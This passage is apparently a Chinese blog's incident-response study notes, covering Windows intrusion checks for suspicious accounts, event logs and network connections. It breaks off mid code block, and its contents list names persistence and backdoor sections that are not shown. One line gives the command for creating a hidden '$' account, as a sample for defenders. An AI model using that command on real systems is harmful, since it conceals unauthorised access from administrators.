<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Safe: 11-应急响应</title>
<meta name="generator" content="Org Mode" />
<link rel="stylesheet" type="text/css" href="/static/font.css"/>
<link rel="stylesheet" type="text/css" href="/static/drollery.e825b870.css"/>
<link rel="icon" href="/favicon.ico" type="image/x-icon">
<link rel="me" href="https://emacs.ch/@jasperhsu">
<meta name="google-adsense-account" content="ca-pub-1741779893655624">
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1741779893655624" crossorigin="anonymous"></script>
<script>
  window.MathJax = {
    tex: {
      ams: {
        multlineWidth: '85%'
      },
      tags: 'ams',
      tagSide: 'right',
      tagIndent: '.8em'
    },
    chtml: {
      scale: 1.0,
      displayAlign: 'center',
      displayIndent: '0em'
    },
    svg: {
      scale: 1.0,
      displayAlign: 'center',
      displayIndent: '0em'
    },
    output: {
      font: 'mathjax-modern',
      displayOverflow: 'overflow'
    }
  };
</script>

<script
  id="MathJax-script"
  async
  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
</script>
</head>
<body>
<header id="preamble" class="status">
<header class="{className}" data-astro-cid-3ef6ksr2>
  <div class=header-branding data-astro-cid-g2lrb5xm>
      <span class=header-text data-astro-cid-g2lrb5xm>
          <span class=dropcap data-astro-cid-g2lrb5xm aria-hidden=true>
              <span class=actual data-astro-cid-g2lrb5xm>J</span>
              <span class=rest data-astro-cid-g2lrb5xm>asper Hsu</span>
              <span class=period data-astro-cid-g2lrb5xm>.</span>
          </span>
          <span class=sr-only data-astro-cid-g2lrb5xm>Drollery</span>
      </span>
      <img alt="Medieval drollery of a knight on a horse" class=spring decoding=async height=250 loading=lazy src=/images/knight-horse.a96eee7d_Z1WCOYs.webp width=68 data-astro-cid-g2lrb5xm>
  </div>

  <nav data-astro-cid-pux6a34n>
      <span class=flower2 data-astro-cid-pux6a34n>M</span>
      <a href=/jcodelog.html class=nobracket data-astro-cid-pux6a34n>技术</a>
      <span class=flower2 data-astro-cid-pux6a34n>K</span>
      <a href=/reading/index.html class=nobracket data-astro-cid-pux6a34n>阅读</a>
      <span class=flower2 data-astro-cid-pux6a34n>J</span>
      <a href=/archives.html class=nobracket data-astro-cid-pux6a34n>归档</a>
      <span class=flower2 data-astro-cid-pux6a34n>L</span>
      <a href=/link/index.html class=nobracket data-astro-cid-pux6a34n>友链</a>
      <span class=flower2 data-astro-cid-pux6a34n>M</span>
      <a href=/about.html class=nobracket data-astro-cid-pux6a34n>关于</a>
      <span class=flower2 data-astro-cid-pux6a34n>J</span>
  </nav>


  <div class="container" data-astro-cid-3ef6ksr2>
    <p class="info" data-astro-cid-3ef6ksr2>
              🏆 欢迎来到本站：
              <a href="https://xuchangwei.com/">https://xuchangwei.com/</a>。
              <strong>希望这里有你感兴趣的内容</strong>。
            </p>
  </div>
  <div id=borderArtWrapper class="tt1" data-astro-cid-5hce7sga data-turbo-permanent>
      <script>
          var man, shakeCount = 0, noSound = new Audio("/audio/effects/no.m4a"), screamSound = new Audio("/audio/effects/scream.m4a");
          function animateManShakeHandler() {
              man.removeEventListener("animationend", animateManShakeHandler, !1),
              shakeCount += 1,
              man.classList.remove("shakeMan")
          }
          function animateManFallHandler() {
              man.removeEventListener("animationend", animateManFallHandler, !1),
              man.classList.add("hide")
          }
          function animateMan() {
              man = man ?? document.getElementById("borderMan"),
              3 === shakeCount ? (man.classList.add("fallMan"),
              screamSound.play(),
              man.addEventListener("animationend", animateManFallHandler, !1)) : (man.classList.add("shakeMan"),
              noSound.play(),
              man.addEventListener("animationend", animateManShakeHandler, !1))
          }
      </script>
      <div class=borderArt data-astro-cid-5dda5nwp id=articleBorder>
          <img alt="flowery border with man falling" decoding=async height=620 loading=lazy src=/images/border-vines-no-man.b7d246cc_DRxSe.webp width=909 class=border data-astro-cid-5dda5nwp>
          <div class=fallWrapper data-astro-cid-5dda5nwp>
              <img alt="flowery border with man falling" decoding=async height=292 loading=lazy src=/images/man-no-vines.247a3187_Z2ioXNM.webp width=98 class=man data-astro-cid-5dda5nwp id=borderMan onclick=animateMan()>
          </div>
      </div>
  </div>
</header>
</header>
<main class="container" id="content" class="content">
<header>
<h1 class="title">Safe: 11-应急响应</h1>
</header><nav id="table-of-contents" role="doc-toc">
<h2>Table of Contents</h2>
<div id="text-table-of-contents" role="doc-toc">
<ul>
<li><a href="#h:a033ffeb-dcc4-4279-b3c3-7a2be4ef0897">入侵排查</a>
<ul>
<li><a href="#h:f842dfa2-d9fb-4813-84ce-755c6f53eb6f">Windows入侵排查</a>
<ul>
<li><a href="#h:aac5153b-992e-45bc-a5eb-b7a15675a6f2">检查系统账号安全</a></li>
<li><a href="#h:d47b0a61-f07d-4f0d-a993-b8f0f6fc88d9">检查异常端口、进程</a></li>
<li><a href="#h:e40411b5-cb77-466a-a2c9-6f1eb8f7de2f">检查启动项、计划任务、服务</a></li>
</ul>
</li>
<li><a href="#h:44523998-1c58-49c0-9428-26688ff69212">Linux入侵排查</a>
<ul>
<li><a href="#h:ac41c858-0a1f-4308-8234-d005472fd39e">账号安全</a></li>
<li><a href="#h:6e8d634e-1453-4cd3-92b7-fdd8dfcff9c0">历史命令</a></li>
<li><a href="#h:9fb560c0-8826-4fa6-b694-6e6670b17165">检查异常端口</a></li>
<li><a href="#h:d329003d-c06e-4b34-bfc3-5a0d70c88f92">检查异常进程</a></li>
<li><a href="#h:ac57c193-f535-4878-9aa4-45de3d31cb19">检查开机启动项</a></li>
<li><a href="#h:b79334bf-218d-402c-8ec9-6ed0cfd09b4d">检查定时任务</a></li>
<li><a href="#h:5b46fbde-efda-408e-96e6-fc4b5ecaa174">检查服务</a></li>
<li><a href="#h:aad1612a-570d-4784-ae87-e9a897040b0c">检查异常文件</a></li>
<li><a href="#h:7a6ff2be-e8c2-4f04-be72-45b597199d35">检查系统日志</a></li>
<li><a href="#h:6401c5d1-dfce-44a3-bce9-018909aaa639">工具查杀</a>
<ul>
<li><a href="#h:20ab8570-f66a-40ff-aeed-2fe75bab1537">Rootkit查杀</a></li>
<li><a href="#h:b6b461cb-37b4-41ea-bd54-b56fbcbd7d54">病毒查杀</a></li>
<li><a href="#h:76205d2d-9ada-4aa7-a8de-8ce3e5e8b5a1">Webshell查杀</a></li>
</ul>
</li>
<li><a href="#h:515b7fac-1aea-487e-99fb-39fa5ec07c29">常见的WebShell查杀工具</a></li>
<li><a href="#h:4a23836f-be6e-4226-a4f4-0b8ffc004a6e">D盾_Web查杀</a></li>
<li><a href="#h:d8ad6e7d-696f-4ffe-a10b-dabf7900fb40">百度 WEBDIR+</a></li>
<li><a href="#h:cc423dff-f97d-415c-950e-a755f0faead8">河马</a></li>
<li><a href="#h:990f249f-8062-447d-956a-bafecf9ffd7f">Web Shell Detector</a></li>
<li><a href="#h:da89d3a2-b79f-4c67-85fb-430251e5a244">CloudWalker（牧云）</a></li>
</ul>
</li>
<li><a href="#h:bef7aac0-add2-483b-95dd-458ed18abf1f">如何发现隐藏的WebShell后门</a>
<ul>
<li><a href="#h:e6afe316-bfc8-4104-bd44-620dce8dc173">MD5校验</a></li>
<li><a href="#h:ed1bfc2e-bfc6-4c8d-ad98-04abf6b0790b">diff 命令</a></li>
<li><a href="#h:fcb4464a-9c37-4ec8-b05f-16c74ec30fcc">文件对比工具</a></li>
</ul>
</li>
<li><a href="#h:f785651d-4c48-4940-8edc-035dd5e57059">勒索病毒自救指南</a>
<ul>
<li><a href="#h:26cb4d10-921a-4d32-bd8d-eacb5892f671">勒索病毒加密原理</a></li>
<li><a href="#h:85408cb0-64ca-4c57-977a-3672675d5ffa">勒索病毒搜索引擎</a></li>
<li><a href="#h:646074d3-1eaf-4e6a-8fae-cbdd4e19cc4f">勒索软件解密工具集</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#h:c26653c9-8354-4a48-b1aa-5154167bcb3a">日志分析</a>
<ul>
<li><a href="#h:c630603c-65f4-4635-b0a6-ed004a034cd5">Windows日志分析</a>
<ul>
<li><a href="#h:84bcb036-c79c-464d-986c-1971f5175d94">Windows事件日志简介</a></li>
<li><a href="#h:501e691b-deb4-4a5c-9908-e2353893bed7">审核策略与事件查看器</a></li>
<li><a href="#h:d84fa5fc-07c9-4ac3-82be-916dde99148a">事件日志分析</a></li>
<li><a href="#h:1082091b-d219-4164-beed-333c51aa58dc">日志分析工具</a>
<ul>
<li><a href="#h:96ad6e3b-e163-4d5e-84e8-542eda403c90">Log Parser</a></li>
<li><a href="#h:a5f29dc0-75c8-4f23-bbdd-fc7654bafc65">LogParser Lizard</a></li>
</ul>
</li>
<li><a href="#h:30d1ca31-a688-453a-bded-78a4bd92d239">充内容</a></li>
</ul>
</li>
<li><a href="#h:76b03265-0d66-46bf-8179-5b57aaad24fc">Linux日志分析</a>
<ul>
<li><a href="#h:1078246b-c584-46c4-877b-b70783565d45">日志简介</a></li>
<li><a href="#h:e1cd4961-0b47-4a15-a250-0c8172c74a46">日志分析技巧</a>
<ul>
<li><a href="#h:64e781d4-dccd-4720-82ed-78a3723aa0f4">常用的shell命令</a></li>
<li><a href="#h:9b00aa5f-61f5-4eaa-bda8-7ed74b25805c">日志分析技巧</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#h:0f71492b-b173-4475-8bdf-550a089b5a07">Web日志分析</a>
<ul>
<li><a href="#h:7aa654f6-bc7f-4031-85a5-028c11571ea4">日志分析技巧</a></li>
<li><a href="#h:af9f46d6-c15d-465d-a977-14dfbc86d5db">日志分析案例</a></li>
<li><a href="#h:b5aaf9c0-eef5-400d-837b-f89c6bec5802">日志统计分析技巧</a></li>
</ul>
</li>
<li><a href="#h:9401981a-7cf6-458a-b060-bfe7149ffbf3">Mysql日志分析</a>
<ul>
<li><a href="#h:f08aa3df-2ea7-4824-87d1-079af315485a">Mysql暴力破解日志分析</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#h:1aec45e7-2501-4277-b22a-20c41fa36fe1">权限维持</a>
<ul>
<li><a href="#h:c3f1c187-ff2b-46cc-a1ff-a9232e8f735f">Windows权限维持-隐藏篇</a>
<ul>
<li><a href="#h:6a83adc9-11a2-4fa4-b4a6-762d3ebc5d31">隐藏文件</a>
<ul>
<li><a href="#h:154fb59a-f437-4db8-8ad8-4ec807786e0b">方法1-利用文件属性</a></li>
<li><a href="#h:6c33a506-482b-422a-a9e7-297387ac4554">方法2-利用ADS(Alternate Data Streams)隐藏文件内容</a></li>
</ul>
</li>
<li><a href="#h:409b7b71-a25c-428b-b265-1bfee181c342">隐藏账号</a></li>
<li><a href="#h:7bff8e4f-6de6-4cf9-9a8e-f5a9814cd141">进程注入</a></li>
</ul>
</li>
<li><a href="#h:a10c8441-9e1b-4801-a3ec-a2194ed60390">Windows权限维持-后门篇</a>
<ul>
<li><a href="#h:937417c7-af8b-450d-9f5b-784f1306db54">粘滞键后门</a></li>
<li><a href="#h:efb03ca1-5a14-426a-bd28-0acab9780c9f">Logon Scripts后门</a></li>
<li><a href="#h:18bacb5e-e0e0-4ac0-9f53-5c13d723bb6f">映像劫持</a></li>
<li><a href="#h:b1c921b3-1d0f-49be-8ca8-a57d6fbbc78b">注册表自启动后门</a></li>
<li><a href="#h:3ec61c18-a92c-4df2-bdbc-b9b317863e9d">计划任务后门</a></li>
<li><a href="#h:19251ff1-a9e2-44b2-a8e6-77cd8d617313">服务自启动后门</a></li>
</ul>
</li>
<li><a href="#h:8c92ed0e-6ef1-4d7d-9886-8346e044a9f4">Linux权限维持-隐藏篇</a>
<ul>
<li><a href="#h:7c9b829f-c16b-43a5-bdc4-c4d7ba3266f8">隐藏文件</a></li>
<li><a href="#h:87e115d3-9cd8-430b-a0db-aec09e79f61e">隐藏文件时间戳</a></li>
<li><a href="#h:4beedc56-2f95-4ce4-8147-00b6726cca9c">隐藏权限</a></li>
<li><a href="#h:a388aa4a-f3b5-4044-849c-3b412c075e9d">隐藏历史操作命令</a></li>
</ul>
</li>
<li><a href="#h:700f5d3c-290f-452f-90e8-e2055a96cdd9">Linux权限维持-后门篇</a>
<ul>
<li><a href="#h:a7913564-0810-46e7-9577-b4c9a0f96db6">一句话添加用户和密码</a></li>
<li><a href="#h:408294ae-7613-4498-82d2-f6322b12a9ae">SSH免密登录</a></li>
</ul>
</li>
<li><a href="#h:44407d4b-cafe-4c37-abb2-015f359766fe">Windows命令行文件下载方式汇总</a>
<ul>
<li><a href="#h:ab2f6774-fca7-4761-9c74-de76620d5b4f">PowerShell</a></li>
<li><a href="#h:e0d3e37a-6e4e-4b23-af50-86283f941a20">Bitsadmin</a></li>
<li><a href="#h:60c828e5-7c43-4253-83fd-6f3b2b3d1090">certutil</a></li>
<li><a href="#h:eb0a9ced-2dd6-40f6-adf2-becbc562c802">msiexec</a></li>
<li><a href="#h:31a4d5cd-9513-4200-b80a-802754bd7849">mshta</a></li>
</ul>
</li>
<li><a href="#h:36fd9f6b-9d03-47f4-9bdf-85ff4495777b">渗透测试框架权限维持技术</a>
<ul>
<li><a href="#h:4315d3f2-4cb0-426e-a7f4-c6942d761779">Persistence模块</a></li>
</ul>
</li>
<li><a href="#h:094b5985-c8f5-4291-a93a-06a33a248be2">常见Webshell管理工具</a>
<ul>
<li><a href="#h:8ba72ce5-0cbf-4ee5-8f05-c907a5403104">菜刀</a></li>
<li><a href="#h:0ec98395-b1e8-4bfe-a106-bd6d8c19b2ea">蚁剑</a></li>
<li><a href="#h:c2a5d40f-3e49-478e-ad2b-c38075584820">冰蝎</a></li>
<li><a href="#h:336be93e-5b56-4497-9dde-f92d4f9be35c">哥斯拉</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#h:a37c3f0c-da61-446b-a906-01ee5e3ca183">Windows 实战</a>
<ul>
<li><a href="#h:2e1d1a9c-0a75-4a2f-89bc-8749186fce91">FTP暴力破解</a></li>
<li><a href="#h:380cb457-03cf-4b88-86f0-bcf17077542f">勒索病毒</a></li>
<li><a href="#h:606725a8-8982-4693-ac45-a6a116b98cf2">挖矿病毒</a></li>
</ul>
</li>
<li><a href="#h:c1741471-1dc6-42cc-9e32-9db2318148be">Linux 实战</a>
<ul>
<li><a href="#h:8c07cd81-c67c-4f47-b602-0575e35a8385">SSH暴力破解</a></li>
<li><a href="#h:db79cc82-db3f-40da-9805-1c94bd82a73c">DDOS病毒</a></li>
</ul>
</li>
<li><a href="#h:5c22d99b-c7db-4c77-b808-3d9cd071c24f">Web 实战</a>
<ul>
<li><a href="#h:d5942152-8df5-4cfb-92b9-26b8b040cb8c">网站被植入Webshell</a></li>
<li><a href="#h:bad43e8b-fba8-43d2-a4c0-707e42f7404b">批量挂黑页</a></li>
<li><a href="#h:608dcf4f-e4b5-402f-8b6c-cb2e6588b04d">新闻源网站劫持</a></li>
<li><a href="#h:98272edc-c33e-4bcd-983c-c11c06aece65">搜索引擎劫持</a></li>
<li><a href="#h:c930cda1-884f-4fe5-9d6d-d98c5dddbb61">网站首页被篡改</a></li>
<li><a href="#h:02bdb174-5393-4e67-8a8c-4c12cf841e13">管理员账号被篡改</a></li>
<li><a href="#h:cc104fdb-f49f-49dc-bdf4-1cad04f5baac">编辑器入侵事件</a></li>
</ul>
</li>
<li><a href="#h:f64b843a-f13d-4fcd-8a73-9987e71b5fc4">撰写应急响应报告</a></li>
</ul>
</div>
</nav>
<ul class="org-ul">
<li>TAGS: <a href="../../index.html">Safe</a><br></li>
</ul>
<section id="outline-container-h:a033ffeb-dcc4-4279-b3c3-7a2be4ef0897" class="outline-2">
<h2 id="h:a033ffeb-dcc4-4279-b3c3-7a2be4ef0897">入侵排查</h2>
<div class="outline-text-2" id="text-h:a033ffeb-dcc4-4279-b3c3-7a2be4ef0897">
<p>
主要内容：<br>
</p>
<ul class="org-ul">
<li>Windows 入侵排查<br></li>
<li>Linux 入侵排查<br></li>
<li>常用的 webshell 查杀工具<br></li>
<li>如何发现隐藏的 webshell 后门<br></li>
<li>勒索病毒自救指南<br></li>
</ul>

<p>
收到应急响应通知，首先确定是否是安全事件。<br>
</p>

<p>
当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。<br>
</p>

<p>
常见的应急响应事件分类：<br>
Web入侵：网页挂马、主页篡改、Webshell<br>
系统入侵：病毒木马、勒索软件、远控后门<br>
网络攻击：DDOS 攻击、DNS 劫持、ARP 欺骗<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">
Web&#20837;&#20405;&#65306;
- &#32593;&#39029;&#25346;&#39532;: &#32593;&#39029;&#19978;&#34987;&#25346;&#20102;&#19968;&#20123;&#26408;&#39532;
- &#20027;&#39029;&#31713;&#25913;&#65306;&#20027;&#35201;&#29992;&#20110;&#19968;&#20123;&#31038;&#20250;&#23618;&#38754;&#25110;&#32773;&#22269;&#23478;&#23618;&#38754;&#30340;&#25915;&#20987;&#12290;&#27604;&#22914;&#37325;&#35201;&#20250;&#35758;&#26399;&#38388;&#25915;&#20987;&#19968;&#20123;&#25919;&#24220;&#32593;&#31449;&#65292;&#22312;&#32593;&#31449;&#21457;&#24067;&#21453;&#21160;&#35328;&#35770;&#12290;&#38450;&#25252;&#19978;&#20113;&#30417;&#25511;&#65292;&#36890;&#36807;&#33050;&#26412;&#25235;&#21462;&#32593;&#31449;&#25152;&#26377;&#38142;&#25509;&#20998;&#26512;&#65292;&#32593;&#31449;&#21457;&#29983;&#24322;&#24120;&#21464;&#21270;&#26102;&#36816;&#32500;&#20154;&#21592;&#23601;&#20250;&#25910;&#21040;&#30701;&#20449;&#36890;&#30693;
- Webshell&#65306;

&#31995;&#32479;&#20837;&#20405;&#65306;
- &#30149;&#27602;&#26408;&#39532;&#65306;
- &#21202;&#32034;&#36719;&#20214;&#65306;
- &#36828;&#25511;&#21518;&#38376;&#65306;
&#31995;&#32479;&#20837;&#20405;&#20027;&#35201;&#20511;&#21161;&#19968;&#20123;&#33258;&#21160;&#21270;&#30340;&#24037;&#20855;&#20998;&#26512;&#30456;&#20851;&#30340;&#36827;&#31243;&#65292;&#26597;&#25214;&#20986;&#24694;&#24847;&#25991;&#20214;&#28982;&#21518;&#36827;&#34892;&#21024;&#38500;&#12290;

&#32593;&#32476;&#25915;&#20987;&#65306;
- DDOS &#25915;&#20987;&#65306; &#38450;&#24481;&#65306;&#37096;&#32626;&#27969;&#37327;&#28165;&#27927;&#35774;&#22791;&#12289;CDN&#20570;&#27969;&#37327;&#20998;&#27969;
- DNS &#21163;&#25345;&#65306;&#25915;&#20987;&#32773;&#21033;&#29992;&#25915;&#20987;&#25163;&#27573;&#31713;&#25913;&#20102;&#26576;&#20010;&#22495;&#21517;&#30340;&#35299;&#26512;&#32467;&#26524;&#65292;&#20351;&#24471;&#25351;&#21521;&#35813;&#22495;&#21517;&#30340;ip&#21464;&#25104;&#20063;&#21478;&#19968;&#20010;ip&#65292;&#23548;&#33268;&#30456;&#24212;&#32593;&#31449;&#30340;&#35775;&#38382;&#34987;&#21163;&#25345;&#21040;&#21478;&#19968;&#20010;&#20551;&#20882;&#30340;&#31449;&#28857;&#65292;&#20174;&#32780;&#23454;&#29616;&#38750;&#27861;&#31363;&#21462;&#29992;&#25143;&#20449;&#24687;&#12289;&#30772;&#22351;&#32593;&#32476;&#26381;&#21153;&#30340;&#30446;&#30340;
- ARP &#27450;&#39575;&#65306;arp&#26159;&#19968;&#20010;&#22320;&#22336;&#35299;&#26512;&#21327;&#35758;&#65292;&#22312;&#23616;&#22495;&#32593;&#37324;&#20027;&#26426;&#38388;&#36890;&#20449;&#21457;&#36865;arp&#24212;&#31572;&#20449;&#24687;&#65292;&#26412;&#22320;&#20027;&#26426;&#25910;&#21040;&#24212;&#31572;&#20449;&#24687;&#21518;&#19981;&#20250;&#39564;&#35777;&#30495;&#23454;&#24615;&#65292;&#20250;&#25226;&#20449;&#24687;&#35760;&#24405;&#22312;&#33258;&#24049;&#30340;&#26144;&#23556;&#34920;&#37324;&#65292;&#36825;&#26679;&#23601;&#20250;&#26377;&#19968;&#20010;ip&#21644;mac&#23545;&#24212;&#20851;&#31995;&#12290;&#25915;&#20987;&#32773;&#21033;&#29992;&#36825;&#31181;&#26426;&#21046;&#21457;&#36865;&#19968;&#20123;&#20266;&#36896;&#30340;arp&#21253;&#65292;&#31713;&#25913;&#20102;&#30446;&#26631;&#20027;&#26426;&#30340;arp&#32531;&#23384;&#34920;&#65292;&#36896;&#25104;&#20027;&#26426;&#38388;&#26080;&#27861;&#27491;&#24120;&#36890;&#20449;&#12290;
&#32593;&#32476;&#25915;&#20987;&#22312;&#22788;&#29702;&#19978;&#30456;&#23545;&#20110;web&#20837;&#20405;&#21644;&#31995;&#32479;&#20837;&#20405;&#26469;&#35828;&#22788;&#29702;&#38590;&#24230;&#36739;&#39640;&#12290;&#22240;&#20026;&#20182;&#20204;&#19981;&#23646;&#20110;&#24120;&#35268;&#30340;&#25915;&#20987;&#65292;&#22914;&#26524;&#25915;&#20987;&#32773;&#30495;&#30340;&#29992;&#36825;&#31181;&#26041;&#27861;&#26469;&#25171;&#20320;&#65292;&#23427;&#32943;&#23450;&#26159;&#19968;&#31181;&#20260;&#25932;1000&#33258;&#25439;800&#30340;&#20570;&#27861;&#12290;
</pre>
</div>
</div>
<div id="outline-container-h:f842dfa2-d9fb-4813-84ce-755c6f53eb6f" class="outline-3">
<h3 id="h:f842dfa2-d9fb-4813-84ce-755c6f53eb6f">Windows入侵排查</h3>
<div class="outline-text-3" id="text-h:f842dfa2-d9fb-4813-84ce-755c6f53eb6f">
<p>
<b>使用环境：Windows Server 2008</b><br>
</p>

<p>
针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，常见 Windows 服务器入侵排查的思路如下。<br>
</p>
</div>
<div id="outline-container-h:aac5153b-992e-45bc-a5eb-b7a15675a6f2" class="outline-4">
<h4 id="h:aac5153b-992e-45bc-a5eb-b7a15675a6f2">检查系统账号安全</h4>
<div class="outline-text-4" id="text-h:aac5153b-992e-45bc-a5eb-b7a15675a6f2">
<p>
<b>1、查看服务器是否有弱口令，远程管理端口是否对公网开放</b><br>
</p>

<p>
检查方法：据实际情况咨询相关服务器管理员。<br>
</p>

<p>
<b>2、查看服务器是否存在可疑账号、新增账号</b><br>
</p>

<p>
检查方法：打开 cmd 窗口，输入 lusrmgr.msc 命令，查看是否有新增/可疑的账号，如有管理员群组的（Administrators）里的新增账户，请立即禁用或删除。<br>
名称后面有$符号是隐藏账号。使用 net user 命令是看不到隐藏账号的。<br>
</p>


<figure id="orgd54a8a4">
<img src="./images/img_20230814_112848.png" alt="img_20230814_112848.png" width="60%"><br>

</figure>

<p>
发现可疑test账号，删除test账号<br>
</p>


<figure id="orgcdb7459">
<img src="./images/img_20230814_112908.png" alt="img_20230814_112908.png" width="60%"><br>

</figure>

<p>
<b>3、查看服务器是否存在隐藏账号、克隆账号</b><br>
</p>

<p>
检查方法：使用D盾_web查杀工具，集成了对隐藏、克隆账号检测的功能<br>
</p>



<figure id="orgde80fb2">
<img src="./images/img_20230814_113003.png" alt="img_20230814_113003.png" width="60%"><br>

</figure>

<div class="org-src-container">
<pre class="src src-sh">net user /add test$ <span style="color: #b22222;"># </span><span style="color: #b22222;">&#22686;&#21152;&#38544;&#34255;&#36134;&#21495;&#21629;&#20196;</span>
</pre>
</div>

<p>
<b>4、结合日志，查看管理员登录时间、用户名是否存在异常</b><br>
</p>

<p>
检查方法：<br>
a、Win+R 打开运行，输入"eventvwr.msc"，回车运行，打开“事件查看器”。<br>
</p>


<figure id="org5c556ad">
<img src="./images/img_20230814_113132.png" alt="img_20230814_113132.png" width="60%"><br>

</figure>

<p>
b、导出 Windows 日志 &#x2013; 安全，利用微软官方工具 <a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">Log Parser</a> 进行分析。<br>
</p>


<figure id="org61c9730">
<img src="./images/img_20230814_113237.png" alt="img_20230814_113237.png" width="60%"><br>

</figure>

<p>
工具下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">https://www.microsoft.com/en-us/download/details.aspx?id=24659</a><br>
</p>

<p>
示例：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">LogParser.exe -i:evt <span style="color: #8b2252;">"select top 100 * from D:\&#31163;&#32447;&#24037;&#20855;\Security.evtx "</span> - o:DATAGRID
LogParser.exe -i:&#36755;&#20837;&#25991;&#20214;&#30340;&#26684;&#24335; SQL&#35821;&#21477; -o&#65306;&#36755;&#20986;&#25991;&#20214;&#30340;&#26684;&#24335;

&#21442;&#25968;&#20351;&#29992;
-i:&lt;&#36755;&#20837;&#28304;&gt;
&#20013;&#38388;&#37096;&#20998;&#65292;sql&#35821;&#21477;
-o:&lt;&#36755;&#20986;&#26684;&#24335;&gt;
</pre>
</div>
</div>
</div>
<div id="outline-container-h:d47b0a61-f07d-4f0d-a993-b8f0f6fc88d9" class="outline-4">
<h4 id="h:d47b0a61-f07d-4f0d-a993-b8f0f6fc88d9">检查异常端口、进程</h4>
<div class="outline-text-4" id="text-h:d47b0a61-f07d-4f0d-a993-b8f0f6fc88d9">
<p>
<b>1、检查网络连接情况，是否有远程连接、可疑连接</b><br>
</p>

<p>
检查方法：<br>
a、使用 netstat -ano 命令查看目前的网络连接，定位可疑的 ESTABLISHED<br>
</p>

<p>
ESTABLISHED：完成连接并正在进行数据通信的状态。<br>
LISTENING：表示处于侦听状态，就是说该端口是开放的，等待连接，但还没有被连接。<br>
CLOSE_WAIT：对方主动关闭连接或者网络异常导致连接中断。<br>
TIME_WAIT：我方主动调用close()断开连接，收到对方确认后状态变为TIME_WAIT。<br>
</p>

<p>
b、根据 netstat 命令定位出的 PID 编号，再通过 tasklist 命令进行进程定位<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">tasklist | findstr <span style="color: #8b2252;">"PID&#32534;&#21495;"</span>

netstat -ano | find <span style="color: #8b2252;">"ESTABLISHED"</span>
tasklist | findstr <span style="color: #8b2252;">"8284"</span>
</pre>
</div>


<figure id="orgd1e46f3">
<img src="./images/img_20230814_134805.png" alt="img_20230814_134805.png" width="60%"><br>

</figure>


<p>
可以进一步去任务管理器的服务选项中确认（不一定能找到，因为webshell是依赖web服务运行的，能找到web服务，webshell不是一个单独运行的服务）<br>
</p>
<ul class="org-ul">
<li>状态栏鼠标右键选择任务管理器<br></li>
</ul>


<figure id="org31ad743">
<img src="./images/img_20230814_134338.png" alt="img_20230814_134338.png" width="60%"><br>

</figure>

<p>
<b>2、进程</b><br>
</p>

<p>
检查方法：依据进程名称查看是否有可疑进程，比如6666.exe可能是木马。<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">tasklist /svc
</pre>
</div>

<div class="org-src-container">
<pre class="src src-sh">C:\Users\jasper&gt;tasklist /svc

Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A
Registry                       136 N/A
</pre>
</div>


<figure id="org1c04a90">
<img src="./images/img_20230814_134844.png" alt="img_20230814_134844.png" width="60%"><br>

</figure>

<p>
a、开始 &#x2013; 运行 &#x2013; 输入 msinfo32 命令，依次点击 "软件环境 &#x2013; 正在运行任务" 就可以查看到进程的详细信息，比如进程路径、进程ID、文件创建日期以及启动时间等。<br>
排查方法：关注版本为不可用的服务<br>
</p>


<figure id="orgc8b25b3">
<img src="./images/img_20230814_134917.png" alt="img_20230814_134917.png" width="60%"><br>

</figure>

<p>
b、打开D盾_web查杀工具，进程查看，关注没有可疑信息的进程<br>
</p>


<figure id="org44082a4">
<img src="./images/img_20230814_135538.png" alt="img_20230814_135538.png" width="60%"><br>

</figure>

<p>
c、通过微软官方提供的 Process Explorer 等工具进行排查<br>
</p>

<p>
工具下载地址：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer">https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer</a><br>
</p>


<figure id="org91dfb6c">
<img src="./images/img_20230814_135603.png" alt="img_20230814_135603.png" width="60%"><br>

</figure>

<p>
d、查看可疑的进程及其子进程<br>
可以通过观察以下内容<br>
</p>
<ul class="org-ul">
<li>没有签名验证信息的进程<br></li>
<li>没有描述信息的进程<br></li>
<li>进程的属主<br></li>
<li>进程的路径是否合法<br></li>
<li>CPU或内存资源占用长时间过高的进程（比如挖矿）<br></li>
</ul>

<p>
常用命令：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">1&#65289;&#26597;&#30475;&#31471;&#21475;&#23545;&#24212;&#30340; PID&#65306;netstat -ano | findstr <span style="color: #8b2252;">"port"</span>

2&#65289;&#26597;&#30475;&#36827;&#31243;&#23545;&#24212;&#30340; PID&#65306;&#20219;&#21153;&#31649;&#29702;&#22120; -- &#26597;&#30475; -- &#36873;&#25321;&#21015; -- PID &#25110;&#32773; tasklist | findstr <span style="color: #8b2252;">"PID"</span>

3&#65289;&#26597;&#30475;&#36827;&#31243;&#23545;&#24212;&#30340;&#31243;&#24207;&#20301;&#32622;&#65306;
   &#20219;&#21153;&#31649;&#29702;&#22120; -- &#36873;&#25321;&#23545;&#24212;&#36827;&#31243; -- &#21491;&#38190;&#25171;&#24320;&#25991;&#20214;&#20301;&#32622;
   &#36816;&#34892;&#36755;&#20837;wmic&#65292;cmd &#30028;&#38754;&#36755;&#20837; process

4&#65289;tasklist /svc &#36827;&#31243; -- PID -- &#26381;&#21153;

5&#65289;&#26597;&#30475;Windows&#26381;&#21153;&#25152;&#23545;&#24212;&#30340;&#31471;&#21475;&#65306;
   %systemroot%/system32/drivers/etc/services&#65288;&#19968;&#33324; %systemroot% &#23601;&#26159; C:\Windows &#36335; &#24452;&#65289;
